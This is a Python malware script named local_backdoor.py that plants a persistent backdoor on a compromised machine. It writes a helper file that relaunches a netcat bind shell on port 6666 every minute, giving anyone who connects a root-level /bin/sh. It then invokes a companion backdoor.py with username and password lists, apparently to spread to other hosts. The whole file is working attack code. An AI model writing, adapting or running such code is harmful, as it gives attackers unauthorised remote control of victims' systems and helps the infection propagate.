""" local_backdoor.py : executed once it is placed in a target system
    Creates a netcar listener that listens on port 6666 for incoming connections
    Once a connection is established, a remote shell will spawn for the attacker
    Also reports that it has been infected back to the initial IP
"""

import time
import subprocess

def persistent_listener():
    """ Creates an infinite loop that refreshes the netcat connection every minute """
    with open("listener.py", "w") as listener:
         listener.write("import time\nimport subprocess\nwhile True:\n\tsubprocess.Popen([\"nohup nc.traditional -l -p 6666 -e /bin/sh &\"], shell=True)\n\ttime.sleep(60)\n")

    #while True:
    #    subprocess.Popen(["nohup nc.traditional -l -p 6666 -e /bin/sh &"], shell=True)
    #    time.sleep(60)

def main():
    """ Main function - used to set up a netcat listener """
    # sys_info stores 3 useful variables:
    # 0: root ip to report to
    # 1: target username
    # 2: target password
    
    persistent_listener()
    subprocess.call("python backdoor.py local_backdoor.py usernames.txt passwords.txt".split(" "))
    subprocess.call("python listener.py".split(" "))

if __name__ == "__main__":
    main()
